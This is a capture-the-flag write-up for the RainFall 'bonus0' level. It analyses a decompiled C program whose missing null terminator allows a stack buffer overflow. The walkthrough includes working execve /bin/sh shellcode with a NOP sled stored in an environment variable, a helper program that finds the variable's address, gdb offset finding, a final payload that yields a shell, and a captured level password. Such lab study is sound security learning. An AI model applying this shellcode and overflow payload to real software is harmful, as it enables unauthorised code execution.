# bonus0

### First analysis

The code of this level is in 3 part but is actually quite simple to understand:

```c
void p(char *ppBuffer, char *message) {
    char    buffer[4096];

    puts(message);
    read(0, buffer, 4096);
    *strchr(buffer, '\n') = 0;
    strncpy(ppBuffer, buffer, 20);

    return;
}

void pp(char *mainBuffer) {
    char    buffer1[20];
    char    buffer2[20];
    size_t  len;

    p(buffer1, " - ");
    p(buffer2, " - ");

    strcpy(mainBuffer, buffer1);

    len = strlen(mainBuffer);
    mainBuffer[len] = ' ';

    strcat(mainBuffer, buffer2);

    return;
}

int main(void) {
    char buffer[54];

    pp(buffer);
    puts(buffer);

    return 0;
}
```

So we have a main function that calls pp and print a buffer of 54 after that. pp() is going to set this buffer following those steps:
- First it created 2 buffers of 20 chars long
- It calls p() function 2 times that read 4096 chars from stdin, and take the firsts 20 chars of it and return it to pp()
- It takes the first 20 chars returned from p(), add a space after, and concatenate with the second return value of p()
- This gives us a buffer like: [20 chars from p()] + ' ' + [20 chars from p()]

We can easily see a problem here, as p() doesn't set a '\0' character at the end of the 20 char, but at the end of the buffer entered by the user. So if we enter more than 20 chars into the first buffer, it won't be null terminated. this gives us this weird results when trying to do so:

```sh
bonus0@RainFall:~$ ./bonus0 
 - 
AAAABBBBCCCCDDDDEEEE
 - 
aaaabbbbccccddddeeee
AAAABBBBCCCCDDDDEEEEaaaabbbbccccddddeeee��� aaaabbbbccccddddeeee���
Segmentation fault (core dumped)

```

As we can see the buffer printed at the end is made of:

```
[20 char first buffer] [20 char second buffer] [???] [20 char second buffer] [???]
```

The question marks are printed because the buffer is non null terminated and doesn't know where to stop reading the string, then segfault.

### A solution ?

So what happend is that the first buffer is set with 20 chars without a '\0' at the end. Since the space memory of buffer1 and buffer2 are next to each other, once buffer2 is set, if we read buffer1, we will read both buffer. So when the program use strcpy to place buffer1 into the main buffer, it actually prints 40 chars (plus a little garbage), then it add a space after, then finally it concatenates buffer2 with the actual states of main buffer. This is why we can see buffer2 appears 2 times. We also understand that an overflow is possible since we have control on 61 char over the 54 main buffer size. (the buffer size in our program is set from decompiler guesses, it could be different, the only thing we know is that there is an overflow).

Now that we know that we can also make an analysis, the size of the buffer of 20 doesn't allow us to make use a shellcode since the shortest we found is 21 chars long. We tried to take the first 20 chars into buffer1 and add the last one into buffer 2 but nothing worked. And we know that we probably need a shellcode since nowhere in the script a shell is launched or the password of bonus1 is printed.

After a bit of researches we found 2 options for short buffer overflow, there is the FPO which doesn't match our situation at all, and there is the usage of a env variable.

Indeed env variables are accessible from the program launched and it uses our env in order to do that. If we used the env to store the shellcode, then find a way to redirect the program to the location in the memory of this env variable, it could work.

For that we first set a env variable for the shellcode with a bunch of NOP instructions before because addresses can slithly change from time to time, so if we reach the bad address, we will fall into the NOP instructions and the shellcode will still work:

```sh
export SHELLCODE=$(python -c "print('\x90' * 500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
```

Then we write a little script to get the address of this shellcode:

```c
int main(int ac, char **av) {
    printf("%p", getenv(av[1]));
    return 0;
}
```

This script is available in ./Resouces/env_address.c, it will print you the address of the env variable, that we will need to translate in little endian.

Once we have this we have to find where to type this address, where can we overflow an address ? For that we do the usual test on gdb that will give us a possible segfault address:

```sh
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
AAAABBBBCCCCDDDDEEEE
 - 
aaaabbbbccccddddeeee
AAAABBBBCCCCDDDDEEEEaaaabbbbccccddddeeee��� aaaabbbbccccddddeeee���

Program received signal SIGSEGV, Segmentation fault.
0x64636363 in ?? ()
```

We see that the address of segfault is 0x64636363 so, the hex value of dccc, in big endian cccd. We know that our address has to be place with a padding of 9 chars in the second argument. And we end up with:

```sh
bonus0@RainFall:~$ (python -c "print '\x90' * 30"; python -c "print 'A' * 9 + '\x1f\xf7\xff\xbf' + 'B' * 7"; cat) | ./bonus0
 - 
 - 
��������������������AAAAAAAAA���BBBBBBB��� AAAAAAAAA���BBBBBBB���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
